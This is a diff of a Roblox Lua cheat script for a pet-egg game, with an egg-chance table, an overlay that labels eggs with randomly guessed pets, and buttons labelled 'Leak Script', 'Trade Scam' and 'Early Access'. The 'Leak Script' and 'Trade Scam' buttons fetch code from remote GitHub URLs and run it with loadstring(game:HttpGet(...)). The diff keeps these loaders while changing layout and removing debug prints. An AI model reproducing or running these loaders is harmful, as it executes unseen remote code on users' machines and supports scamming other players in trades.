@@ -24,20 +24,20 @@ local eggChances = {
         {name="Kappa",chance=3.53},
         {name="Kitsune",chance=7}
     },
-["Enchanted Egg"] = {
-    {name = "Ladybug", chance = 50},
-    {name = "Pixie", chance = 29},
-    {name = "Imp", chance = 15},
-    {name = "Glimmering Sprite", chance = 5},
-    {name = "Cockatrice", chance = 0.5},
-},
-["Sprout Egg"] = {
-    {name="Dairy Cow", chance=50},
-    {name="Jackalope", chance=31},
-    {name="Seedling", chance=12},
-    {name="Golem", chance=6},
-    {name="Golden Goose", chance=6}
-},
+    ["Enchanted Egg"] = {
+        {name = "Ladybug", chance = 50},
+        {name = "Pixie", chance = 29},
+        {name = "Imp", chance = 15},
+        {name = "Glimmering Sprite", chance = 5},
+        {name = "Cockatrice", chance = 0.5},
+    },
+    ["Sprout Egg"] = {
+        {name="Dairy Cow", chance=50},
+        {name="Jackalope", chance=31},
+        {name="Seedling", chance=12},
+        {name="Golem", chance=6},
+        {name="Golden Goose", chance=6}
+    },
     ["Gourmet Egg"] = {  
         {name="Bagel Bunny", chance=50},  
         {name="Pancake Mole", chance=38},  
@@ -46,6 +46,7 @@ local eggChances = {
         {name="French Fry Ferret", chance=0.5}  
     }
 }
+
 -- Tracks ESP visibility state
 local espEnabled = false
 
@@ -143,15 +144,6 @@ autoAgeBtn.TextSize = 15
 autoAgeBtn.Text = "Auto Age (hold pet)"
 autoAgeBtn.LayoutOrder = 3
 
-local mutationTitle = Instance.new("TextLabel", buttonHolder)
-mutationTitle.Size = UDim2.new(1, 0, 0, 20)
-mutationTitle.BackgroundTransparency = 1
-mutationTitle.Text = "Pet Mutation Hacks 🔽"
-mutationTitle.Font = Enum.Font.GothamBold
-mutationTitle.TextSize = 16
-mutationTitle.TextColor3 = Color3.fromRGB(255, 100, 100)
-mutationTitle.LayoutOrder = 4
-
 local leakScriptBtn = Instance.new("TextButton", buttonHolder)
 leakScriptBtn.Size = UDim2.new(1, 0, 0, 40)
 leakScriptBtn.BackgroundColor3 = Color3.fromRGB(220, 0, 0)
@@ -159,7 +151,7 @@ leakScriptBtn.TextColor3 = Color3.new(1, 1, 1)
 leakScriptBtn.Font = Enum.Font.GothamBold
 leakScriptBtn.TextSize = 15
 leakScriptBtn.Text = "Leak Script"
-leakScriptBtn.LayoutOrder = 7
+leakScriptBtn.LayoutOrder = 4
 
 leakScriptBtn.MouseButton1Click:Connect(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Makuscripts/Source/refs/heads/main/Source", true))()
@@ -173,11 +165,12 @@ tradeScamBtn.TextColor3 = Color3.new(1, 1, 1)
 tradeScamBtn.Font = Enum.Font.GothamBold
 tradeScamBtn.TextSize = 15
 tradeScamBtn.Text = "Trade Scam"
-tradeScamBtn.LayoutOrder = 8
+tradeScamBtn.LayoutOrder = 5
 
 tradeScamBtn.MouseButton1Click:Connect(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Makuscripts/NewFeatureTr/refs/heads/main/NewFeatureTr"))()
 end)
+
 -- NEW Early Access Button
 local earlyAccessBtn = Instance.new("TextButton", buttonHolder)
 earlyAccessBtn.Size = UDim2.new(1, 0, 0, 40)
@@ -186,7 +179,7 @@ earlyAccessBtn.TextColor3 = Color3.new(1, 1, 1)
 earlyAccessBtn.Font = Enum.Font.GothamBold
 earlyAccessBtn.TextSize = 15
 earlyAccessBtn.Text = "Early Access"
-earlyAccessBtn.LayoutOrder = 9
+earlyAccessBtn.LayoutOrder = 6
 
 earlyAccessBtn.MouseButton1Click:Connect(function()
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -207,7 +200,6 @@ end)
 
 -- Table to store ESP Billboards
 local espBillboards = {}
-
 local MAX_DISTANCE = 60 -- studs max distance for ESP to appear
 
 -- Clear ESP
@@ -239,16 +231,10 @@ local function createESP(eggModel)
 	if espBillboards[eggModel] then return end
 
 	local adornee = eggModel.PrimaryPart or eggModel:FindFirstChildWhichIsA("BasePart")
-	if not adornee then
-		print("No PrimaryPart or BasePart found for egg:", eggModel.Name)
-		return
-	end
+	if not adornee then return end
 
 	local eggName = eggModel.Name
-	if not eggChances[eggName] then
-		print("Egg name not in eggChances:", eggName)
-		return
-	end
+	if not eggChances[eggName] then return end
 
 	local petName = getRandomPet(eggName)
 
@@ -281,7 +267,6 @@ local function createESP(eggModel)
 	petLabel.TextScaled = true
 
 	espBillboards[eggModel] = billboard
-	print("Created ESP for egg:", eggName)
 end
 
 -- Refresh all ESP with proximity filter
@@ -294,7 +279,6 @@ local function refreshESP()
 	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
 	local hrp = char.HumanoidRootPart
 
-	print("Found eggs count:", #eggs)
 	for _, egg in ipairs(eggs) do
 		local adornee = egg.PrimaryPart or egg:FindFirstChildWhichIsA("BasePart")
 		if adornee then
@@ -370,5 +354,4 @@ autoAgeBtn.MouseButton1Click:Connect(function()
 
 	autoAgeBtn.Text = "Auto Age (hold pet)"
 	isCooldown = false
-	end
-end
+end)
